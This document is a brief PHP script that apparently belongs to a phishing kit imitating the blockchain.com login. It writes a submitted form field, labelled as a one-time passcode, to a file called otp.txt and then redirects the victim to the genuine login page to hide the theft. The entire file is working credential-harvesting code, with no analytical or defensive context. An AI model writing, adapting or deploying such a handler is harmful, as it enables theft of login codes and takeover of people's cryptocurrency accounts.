<?php

file_put_contents("otp.txt", "OTP: " . $_POST['login_email'] . "\n", FILE_APPEND);
header('Location: https://login.blockchain.com/#/login');
exit();
